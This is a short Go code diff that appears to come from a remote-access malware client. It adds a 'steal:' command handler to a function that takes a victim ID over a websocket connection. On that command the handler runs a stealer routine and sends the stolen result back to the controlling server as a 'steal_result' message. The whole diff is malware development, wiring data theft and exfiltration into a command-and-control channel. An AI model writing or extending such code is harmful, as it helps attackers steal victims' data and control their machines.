@@ -254,6 +254,20 @@ func handleServerCommand(conn *websocket.Conn, victimID, command string) {
 		return
 	}
 
+	if strings.HasPrefix(lower, "steal:") {
+		go func() {
+			result := runStealer()
+			if result != "" && conn != nil {
+				_ = wsWriteJSON(conn, map[string]interface{}{
+					"type":      "steal_result",
+					"data":      result,
+					"auto_steal": "",
+				})
+			}
+		}()
+		return
+	}
+
 	cmdPrefix := strings.ToLower(getCmdPrefix())
 	bgPrefix := strings.ToLower(getBgPrefix())
 	if strings.HasPrefix(lower, bgPrefix) {
